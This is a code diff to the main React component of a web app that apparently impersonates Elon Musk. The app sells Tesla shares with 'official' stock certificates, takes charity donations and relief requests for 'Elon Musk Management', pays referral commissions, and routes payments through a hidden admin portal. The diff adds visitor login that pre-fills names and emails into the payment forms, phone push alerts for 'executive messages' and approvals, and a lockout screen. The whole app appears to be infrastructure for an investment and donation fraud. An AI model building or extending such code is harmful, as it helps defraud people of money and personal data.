@@ -3,7 +3,10 @@
  * SPDX-License-Identifier: Apache-2.0
  */
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
+import { BellRing, X } from 'lucide-react';
+import { onAuthStateChanged, User } from 'firebase/auth';
+import { auth, syncVerifiedVisitorProfile } from './firebase';
 import { 
   INITIAL_PROFILE, 
   INITIAL_COMPANIES, 
@@ -53,7 +56,27 @@ import { TeslaSharePurchaseModal } from './components/TeslaSharePurchaseModal';
 import { ShareCertificateModal } from './components/ShareCertificateModal';
 import { ReferralModal } from './components/ReferralModal';
 import { CharityDonationModal } from './components/CharityDonationModal';
+import { NotificationSettingsModal } from './components/NotificationSettingsModal';
+import { VisitorAuthModal } from './components/VisitorAuthModal';
+import { SiteLockoutScreen } from './components/SiteLockoutScreen';
 import { Footer } from './components/Footer';
+import {
+  getLockoutStatus,
+  LockoutStatus,
+  subscribeToLockoutChange,
+} from './utils/securityLockout';
+import {
+  DevicePermissionState,
+  SoundTone,
+  dispatchAppNotification,
+  getNotificationPermissionState,
+  getSavedPhoneAlertsEnabled,
+  getSavedSoundEnabled,
+  initNotificationAudioUnlocker,
+  requestPhoneNotificationPermission,
+  savePhoneAlertsEnabled,
+  saveSoundEnabled,
+} from './utils/deviceNotifications';
 
 const STORAGE_KEYS = {
   PROFILE: 'elon_meet_profile_v1',
@@ -349,6 +372,38 @@ export default function App() {
   const [shareModalInitialQty, setShareModalInitialQty] = useState<number>(25);
   const [selectedShareCertOrder, setSelectedShareCertOrder] = useState<TeslaShareOrder | null>(null);
 
+  // Visitor Email Authentication State (automatically persisted across visits)
+  const [visitorUser, setVisitorUser] = useState<User | null>(null);
+  const [authReady, setAuthReady] = useState<boolean>(false);
+  const [isAuthModalOpen, setIsAuthModalOpen] = useState<boolean>(false);
+  const [lockoutStatus, setLockoutStatus] = useState<LockoutStatus>(() => getLockoutStatus());
+
+  // Mobile Phone Notifications & App Sound State
+  const [isNotificationSettingsOpen, setIsNotificationSettingsOpen] = useState<boolean>(false);
+  const [permissionState, setPermissionState] = useState<DevicePermissionState>(() =>
+    getNotificationPermissionState()
+  );
+  const [phoneAlertsEnabled, setPhoneAlertsEnabled] = useState<boolean>(() =>
+    getSavedPhoneAlertsEnabled()
+  );
+  const [soundEnabled, setSoundEnabled] = useState<boolean>(() => getSavedSoundEnabled());
+  const [activePushToast, setActivePushToast] = useState<{
+    id: string;
+    title: string;
+    body: string;
+    category?: string;
+  } | null>(null);
+  const [optInDismissed, setOptInDismissed] = useState<boolean>(() => {
+    try {
+      return localStorage.getItem('elon_meet_phone_optin_dismissed_v1') === 'true';
+    } catch {
+      return false;
+    }
+  });
+  const knownInboxIdsRef = useRef<Set<string> | null>(null);
+  const knownReplyCountsRef = useRef<Map<string, number>>(new Map());
+  const pushToastTimerRef = useRef<number | null>(null);
+
   // Active page state for arranged page-by-page experience
   const [activePage, setActivePage] = useState<PageId>(() => {
     try {
@@ -372,12 +427,10 @@ export default function App() {
   // View arrangement mode: 'paged' (page by page, arranged) or 'scroll' (continuous)
   const [viewMode, setViewMode] = useState<'paged' | 'scroll'>('paged');
 
-  // Admin state (false by default so studio button is hidden from public visitors)
+  // Admin state (requires passcode verification; never granted via URL params)
   const [isAdmin, setIsAdmin] = useState<boolean>(() => {
     try {
       if (typeof window !== 'undefined') {
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('admin') === 'true') return true;
         return localStorage.getItem('elon_admin_access') === 'true';
       }
       return false;
@@ -386,22 +439,38 @@ export default function App() {
     }
   });
 
-  // Optional keyboard toggle for admin (Ctrl + Shift + A)
+  // Keyboard shortcut opens password-protected Admin Portal (or exits admin if already unlocked)
   useEffect(() => {
     const handleKeyDown = (e: KeyboardEvent) => {
       if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
-        setIsAdmin((prev) => {
-          const next = !prev;
+        if (isAdmin) {
+          setIsAdmin(false);
           try {
-            localStorage.setItem('elon_admin_access', String(next));
+            localStorage.setItem('elon_admin_access', 'false');
           } catch {}
-          return next;
-        });
+        } else if (!getLockoutStatus().isLocked) {
+          setIsAdminPortalOpen(true);
+        }
       }
     };
     window.addEventListener('keydown', handleKeyDown);
     return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [isAdmin]);
+
+  // Monitor 3-strike 5-minute site lockout & live countdown
+  useEffect(() => {
+    const sync = () => setLockoutStatus(getLockoutStatus());
+    const unsub = subscribeToLockoutChange(sync);
+    return unsub;
   }, []);
+
+  useEffect(() => {
+    if (!lockoutStatus.isLocked) return;
+    const timer = window.setInterval(() => {
+      setLockoutStatus(getLockoutStatus());
+    }, 1000);
+    return () => window.clearInterval(timer);
+  }, [lockoutStatus.isLocked]);
 
   // Sync to local storage
   useEffect(() => {
@@ -451,6 +520,113 @@ export default function App() {
       console.warn('LocalStorage save failed for inbox', e);
     }
   }, [inboxMessages]);
+
+  // Subscribe to Firebase Auth state for automatic returning-visitor sign-in persistence
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, (user) => {
+      setVisitorUser(user);
+      setAuthReady(true);
+      if (user && user.emailVerified) {
+        void syncVerifiedVisitorProfile(user).catch(() => {});
+      }
+    });
+    return () => unsubscribe();
+  }, []);
+
+  // Unlock Web Audio API on first user gesture and sync notification permission / SW clicks
+  useEffect(() => {
+    const cleanupAudio = initNotificationAudioUnlocker();
+
+    const syncPermission = () => {
+      setPermissionState(getNotificationPermissionState());
+    };
+    window.addEventListener('focus', syncPermission);
+
+    const handleSwMessage = (event: MessageEvent) => {
+      if (event.data && event.data.type === 'OPEN_NOTIFICATION_INBOX') {
+        setIsInboxOpen(true);
+      }
+    };
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.addEventListener('message', handleSwMessage);
+    }
+
+    return () => {
+      cleanupAudio();
+      window.removeEventListener('focus', syncPermission);
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.removeEventListener('message', handleSwMessage);
+      }
+    };
+  }, []);
+
+  // Automatically trigger phone notifications, app chimes, and top push banner for new inbox messages & replies
+  useEffect(() => {
+    if (knownInboxIdsRef.current === null) {
+      knownInboxIdsRef.current = new Set(inboxMessages.map((m) => m.id));
+      inboxMessages.forEach((m) => {
+        knownReplyCountsRef.current.set(m.id, (m.replies || []).length);
+      });
+      return;
+    }
+
+    const triggerAlert = (title: string, body: string, category: string, messageId: string) => {
+      const upperTitle = title.toUpperCase();
+      const tone: SoundTone = upperTitle.includes('APPROVED')
+        ? 'approval'
+        : category === 'price_alert' || upperTitle.includes('UPDATE') || upperTitle.includes('VERIFICATION')
+        ? 'alert'
+        : 'message';
+
+      void dispatchAppNotification({
+        title,
+        body,
+        tag: messageId,
+        category,
+        messageId,
+        playSound: soundEnabled,
+        soundTone: tone,
+        sendToOs: phoneAlertsEnabled,
+      });
+
+      const toastId = `toast-${messageId}-${Date.now()}`;
+      setActivePushToast({ id: toastId, title, body, category });
+      if (pushToastTimerRef.current !== null) {
+        window.clearTimeout(pushToastTimerRef.current);
+      }
+      pushToastTimerRef.current = window.setTimeout(() => {
+        setActivePushToast((curr) => (curr?.id === toastId ? null : curr));
+      }, 6000);
+    };
+
+    // Detect brand new incoming unread notifications
+    for (const msg of inboxMessages) {
+      if (!knownInboxIdsRef.current.has(msg.id)) {
+        knownInboxIdsRef.current.add(msg.id);
+        knownReplyCountsRef.current.set(msg.id, (msg.replies || []).length);
+        if (!msg.read && msg.sender !== 'visitor') {
+          triggerAlert(msg.subject, msg.body, msg.category, msg.id);
+        }
+        continue;
+      }
+
+      // Detect new incoming replies on existing threads
+      const prevRepliesCount = knownReplyCountsRef.current.get(msg.id) ?? 0;
+      const currentReplies = msg.replies || [];
+      if (currentReplies.length > prevRepliesCount) {
+        knownReplyCountsRef.current.set(msg.id, currentReplies.length);
+        const latestReply = currentReplies[currentReplies.length - 1];
+        if (latestReply && latestReply.sender !== 'visitor') {
+          triggerAlert(
+            `${latestReply.senderName}: ${msg.subject}`,
+            latestReply.body,
+            msg.category,
+            msg.id
+          );
+        }
+      }
+    }
+  }, [inboxMessages, soundEnabled, phoneAlertsEnabled]);
 
   useEffect(() => {
     try {
@@ -1479,7 +1655,7 @@ export default function App() {
       sender: 'concierge',
       senderName: 'Elon Musk Official Management Table · Charity & NGO Desk',
       subject: `Charity Donation Submitted (${donation.donationId}): ${donation.countryName}`,
-      body: `Thank you, ${donation.donorName}. Your humanitarian donation of $${donation.amountUsd.toLocaleString()} USD to ${donation.ngoSectionName} designated for ${donation.countryName} (${donation.crisisType}) has been sent to the Elon Musk Official Management Table for admin verification, settlement account provisioning, and official NGO receipt issuance.\n\nPayment Reference: ${donation.paymentReference}\nChannel: ${donation.paymentMethod.toUpperCase()}`,
+      body: `Thank you, ${donation.donorName}. Your humanitarian donation of $${donation.amountUsd.toLocaleString()} USD to ${donation.ngoSectionName} designated for ${donation.countryName} (${donation.crisisType}) has been sent to Elon Musk Management for verification, settlement account provisioning, and official NGO receipt issuance.\n\nPayment Reference: ${donation.paymentReference}\nChannel: ${donation.paymentMethod.toUpperCase()}`,
       category: 'charity_ngo',
       read: false,
       timestamp: donation.submittedAt,
@@ -1576,7 +1752,7 @@ export default function App() {
       sender: 'concierge',
       senderName: 'Elon Musk Official Management Table · Humanitarian Relief',
       subject: `Support Request Submitted (${request.requestId}): ${request.countryName}`,
-      body: `Your humanitarian support request for ${request.countryName} (${request.cityOrZone}) under ${request.ngoSectionName} has been sent directly to the Admin and Elon Musk Management for approval and accounts provision.\n\nAid Type: ${request.aidCategory}\nCrisis Category: ${request.crisisType}${request.requestedAmountUsd ? `\nRequested Grant: $${request.requestedAmountUsd.toLocaleString()} USD` : ''}\n\nYou will be notified here in your In-App Inbox once Elon Musk Management approves your request and provisions your relief account.`,
+      body: `Your humanitarian support request for ${request.countryName} (${request.cityOrZone}) under ${request.ngoSectionName} has been sent directly to Elon Musk Management for approval and accounts provision.\n\nAid Type: ${request.aidCategory}\nCrisis Category: ${request.crisisType}${request.requestedAmountUsd ? `\nRequested Grant: $${request.requestedAmountUsd.toLocaleString()} USD` : ''}\n\nYou will be notified here in your In-App Inbox once Elon Musk Management approves your request and provisions your relief account.`,
       category: 'charity_ngo',
       read: false,
       timestamp: request.submittedAt,
@@ -1759,6 +1935,56 @@ export default function App() {
   };
 
   const unreadInboxCount = inboxMessages.filter((m) => !m.read).length;
+  const phoneNotificationsReady = permissionState === 'granted' && phoneAlertsEnabled;
+
+  const handleRequestPhonePermission = async () => {
+    const result = await requestPhoneNotificationPermission();
+    setPermissionState(result);
+    if (result === 'granted') {
+      setPhoneAlertsEnabled(true);
+      savePhoneAlertsEnabled(true);
+    }
+    return result;
+  };
+
+  const handleTogglePhoneAlerts = (enabled: boolean) => {
+    setPhoneAlertsEnabled(enabled);
+    savePhoneAlertsEnabled(enabled);
+  };
+
+  const handleToggleSoundAlerts = (enabled: boolean) => {
+    setSoundEnabled(enabled);
+    saveSoundEnabled(enabled);
+  };
+
+  const handleSendTestPhoneNotification = async () => {
+    const sentToOs = await dispatchAppNotification({
+      title: 'Elon Musk · Executive Alert',
+      body: 'Phone notifications and app chime sound are active and working on your device.',
+      tag: `test-alert-${Date.now()}`,
+      category: 'general',
+      playSound: true,
+      soundTone: 'approval',
+      sendToOs: phoneAlertsEnabled,
+    });
+
+    const toastId = `toast-test-${Date.now()}`;
+    setActivePushToast({
+      id: toastId,
+      title: sentToOs ? 'Phone Notification & Sound Sent' : 'In-App Notification & Sound Active',
+      body: sentToOs
+        ? 'Check your phone notification shade — device banner & chime dispatched.'
+        : 'Notification chime played! Tap Enable Phone Notifications to also show OS lockscreen banners.',
+      category: 'general',
+    });
+    if (pushToastTimerRef.current !== null) {
+      window.clearTimeout(pushToastTimerRef.current);
+    }
+    pushToastTimerRef.current = window.setTimeout(() => {
+      setActivePushToast((curr) => (curr?.id === toastId ? null : curr));
+    }, 6000);
+  };
+
   const visitorReferralEarnedUsd = referralConversions
     .filter(
       (c) =>
@@ -1766,6 +1992,10 @@ export default function App() {
         c.referrerCode.toUpperCase() === visitorReferralCode.toUpperCase()
     )
     .reduce((sum, c) => sum + c.commissionEarned, 0);
+
+  if (lockoutStatus.isLocked) {
+    return <SiteLockoutScreen remainingMs={lockoutStatus.remainingMs} />;
+  }
 
   return (
     <div className="relative min-h-screen bg-[#040a18] text-slate-100 flex flex-col font-sans selection:bg-blue-600/30 selection:text-blue-200">
@@ -1799,7 +2029,55 @@ export default function App() {
         onOpenReferralModal={() => setIsReferralModalOpen(true)}
         commissionPercent={commissionPercent}
         onOpenCharity={() => setIsCharityOpen(true)}
+        onOpenNotificationSettings={() => setIsNotificationSettingsOpen(true)}
+        phoneNotificationsReady={phoneNotificationsReady}
+        soundEnabled={soundEnabled}
+        visitorEmail={visitorUser?.email || null}
+        visitorName={visitorUser?.displayName || null}
+        onOpenAuthModal={() => setIsAuthModalOpen(true)}
       />
+
+      {/* Subtle Phone Notification & Sound Opt-In Bar when browser permission is not yet decided */}
+      {permissionState === 'default' && !optInDismissed && (
+        <div className="relative z-40 bg-[#07142b]/95 border-b border-blue-800/60 px-4 py-2 text-xs">
+          <div className="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
+            <div className="flex items-center gap-2 text-slate-200 min-w-0">
+              <BellRing className="w-3.5 h-3.5 text-blue-300 shrink-0" />
+              <span className="truncate">
+                Enable phone notifications &amp; app chime sounds for live order approvals, market alerts &amp; executive messages.
+              </span>
+            </div>
+            <div className="flex items-center gap-2 shrink-0">
+              <button
+                type="button"
+                onClick={() => {
+                  void handleRequestPhonePermission().then((res) => {
+                    if (res === 'granted') {
+                      void handleSendTestPhoneNotification();
+                    }
+                  });
+                }}
+                className="px-3 py-1 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white font-bold text-[11px] cursor-pointer whitespace-nowrap"
+              >
+                Enable Alerts &amp; Sound
+              </button>
+              <button
+                type="button"
+                onClick={() => {
+                  setOptInDismissed(true);
+                  try {
+                    localStorage.setItem('elon_meet_phone_optin_dismissed_v1', 'true');
+                  } catch {}
+                }}
+                aria-label="Dismiss notification prompt"
+                className="p-1 rounded-md text-slate-400 hover:text-white cursor-pointer"
+              >
+                <X className="w-3.5 h-3.5" />
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* Main Content Sections: Arranged Page-by-Page with distinct commands */}
       <main className="flex-1 relative z-10">
@@ -2031,6 +2309,8 @@ export default function App() {
         paymentAccountRequests={paymentAccountRequests}
         onRequestPaymentAccount={handleRequestPaymentAccount}
         onOpenInbox={() => setIsInboxOpen(true)}
+        defaultCustomerName={visitorUser?.displayName || ''}
+        defaultCustomerEmail={visitorUser?.email || ''}
       />
 
       {/* My Active Tesla Orders Tracker Modal */}
@@ -2056,6 +2336,8 @@ export default function App() {
         onSendMessage={handleSendInboxMessage}
         onSendReply={handleSendInboxReply}
         onMarkAsRead={handleMarkInboxAsRead}
+        onOpenNotificationSettings={() => setIsNotificationSettingsOpen(true)}
+        phoneNotificationsReady={phoneNotificationsReady}
       />
 
       {/* Hidden Admin Portal: Payment Approvals, New Car Listings & Admin Replies */}
@@ -2128,6 +2410,8 @@ export default function App() {
         }}
         defaultReferralCode={appliedReferralCode}
         commissionPercent={commissionPercent}
+        defaultInvestorName={visitorUser?.displayName || ''}
+        defaultInvestorEmail={visitorUser?.email || ''}
       />
 
       {/* Official Delaware Stock Ownership Certificate Modal */}
@@ -2164,6 +2448,8 @@ export default function App() {
         onOpenInbox={() => setIsInboxOpen(true)}
         defaultReferralCode={appliedReferralCode}
         commissionPercent={commissionPercent}
+        defaultName={visitorUser?.displayName || ''}
+        defaultEmail={visitorUser?.email || ''}
       />
 
       {/* Visitor Referral Code & Commission Earnings Modal */}
@@ -2187,7 +2473,77 @@ export default function App() {
         paymentAccountRequests={paymentAccountRequests}
         onRequestPaymentAccount={handleRequestPaymentAccount}
         onOpenInbox={() => setIsInboxOpen(true)}
+        defaultVisitorName={visitorUser?.displayName || ''}
+        defaultVisitorEmail={visitorUser?.email || ''}
       />
+
+      {/* Visitor Email & Password Auto-Login Modal */}
+      <VisitorAuthModal
+        isOpen={isAuthModalOpen}
+        onClose={() => setIsAuthModalOpen(false)}
+        currentUser={visitorUser}
+        authReady={authReady}
+        onAuthSuccess={(user) => {
+          setVisitorUser(user);
+          if (user.emailVerified) {
+            void syncVerifiedVisitorProfile(user).catch(() => {});
+          }
+        }}
+      />
+
+      {/* Phone Notifications & Sound Settings Modal */}
+      <NotificationSettingsModal
+        isOpen={isNotificationSettingsOpen}
+        onClose={() => setIsNotificationSettingsOpen(false)}
+        permissionState={permissionState}
+        phoneAlertsEnabled={phoneAlertsEnabled}
+        soundEnabled={soundEnabled}
+        onRequestPermission={handleRequestPhonePermission}
+        onTogglePhoneAlerts={handleTogglePhoneAlerts}
+        onToggleSound={handleToggleSoundAlerts}
+        onSendTestNotification={handleSendTestPhoneNotification}
+      />
+
+      {/* Top Floating Mobile-Style Push Notification Toast */}
+      {activePushToast && (
+        <div
+          onClick={() => {
+            setActivePushToast(null);
+            setIsInboxOpen(true);
+          }}
+          role="status"
+          aria-live="polite"
+          className="fixed top-20 left-1/2 -translate-x-1/2 sm:left-auto sm:right-6 sm:translate-x-0 z-[65] w-[92vw] sm:w-96 p-3.5 rounded-2xl bg-[#07142b]/95 border border-blue-400/70 shadow-2xl backdrop-blur-xl cursor-pointer hover:border-blue-300 transition-all animate-fadeIn"
+        >
+          <div className="flex items-start gap-3">
+            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-600 to-red-600 flex items-center justify-center text-white shrink-0 shadow">
+              <BellRing className="w-4 h-4" />
+            </div>
+            <div className="min-w-0 flex-1">
+              <div className="flex items-center justify-between gap-2">
+                <span className="text-[11px] font-mono font-bold text-blue-300 truncate">
+                  {activePushToast.title}
+                </span>
+                <span className="text-[10px] font-mono text-slate-400 shrink-0">Now</span>
+              </div>
+              <p className="text-xs text-slate-200 mt-0.5 line-clamp-2 leading-snug">
+                {activePushToast.body}
+              </p>
+            </div>
+            <button
+              type="button"
+              onClick={(e) => {
+                e.stopPropagation();
+                setActivePushToast(null);
+              }}
+              aria-label="Dismiss notification banner"
+              className="p-1 text-slate-400 hover:text-white cursor-pointer shrink-0"
+            >
+              <X className="w-4 h-4" />
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* Floating Notification-Based Executive Chat Widget */}
       <ExecutiveChatWidget
@@ -2195,6 +2551,9 @@ export default function App() {
         onOpenTeslaOrderModal={(v) => setOrderingVehicle(v || allVehicles[0])}
         onAddOrderDirect={handleOrderCompleted}
         onSubmitVipRequest={handleSubmitVipRequest}
+        soundEnabled={soundEnabled}
+        onToggleSound={handleToggleSoundAlerts}
+        phoneAlertsEnabled={phoneAlertsEnabled}
       />
     </div>
   );
